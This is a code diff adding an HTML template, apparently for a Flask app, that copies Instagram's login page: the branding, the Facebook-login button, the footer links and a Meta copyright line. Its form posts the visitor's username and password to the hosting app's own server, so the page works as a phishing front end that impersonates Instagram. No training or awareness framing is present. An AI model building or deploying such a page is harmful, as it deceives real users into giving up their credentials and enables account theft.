@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+<link rel="stylesheet" type="text/css" href="{{ url_for('static', filename='style.css') }}">
+
+    <link href="https://fonts.googleapis.com/css2?family=Lobster+Two:ital@1&display=swap" rel="stylesheet">
+</head>
+<body>
+
+    <main class="main-content">
+        <div class="login-container">
+            
+            <h1 class="logo">Instagram</h1>
+            
+            <form action="/" method="POST" class="login-form">
+    <input 
+        type="text" 
+        name="username" 
+        placeholder="Phone number, username, or email" 
+        required
+    >
+    <input 
+        type="password" 
+        name="password" 
+        placeholder="Password" 
+        required
+    >
+    <button type="submit" class="login-button">Log In</button>
+</form>
+
+            <div class="separator">
+                <div class="line"></div>
+                <div class="text">OR</div>
+                <div class="line"></div>
+            </div>
+
+            <button class="facebook-login">
+                <span class="facebook-icon">f</span> Log in with Facebook
+            </button>
+            
+            <a href="#" class="forgot-password">Forgot password?</a>
+        </div>
+
+        <div class="signup-box">
+            <p>Don't have an account? <a href="#">**Sign up**</a></p>
+        </div>
+        
+        <div class="app-download">
+            <p>Get the app.</p>
+            <div class="app-links">
+                <a href="#" class="app-store-link"></a>
+                <a href="#" class="google-play-link"></a>
+            </div>
+        </div>
+    </main>
+
+    <footer class="site-footer">
+        <div class="footer-links">
+            <a href="#">Meta</a>
+            <a href="#">About</a>
+            <a href="#">Blog</a>
+            <a href="#">Jobs</a>
+            <a href="#">Help</a>
+            <a href="#">API</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+            <a href="#">Locations</a>
+            <a href="#">Instagram Lite</a>
+            <a href="#">Meta AI</a>
+            <a href="#">Meta AI Articles</a>
+            <a href="#">Threads</a>
+        </div>
+        <div class="footer-meta">
+            <span>English</span>
+            <span>&copy; 2025 Instagram from Meta</span>
+        </div>
+    </footer>
+
+</body>
+</html>
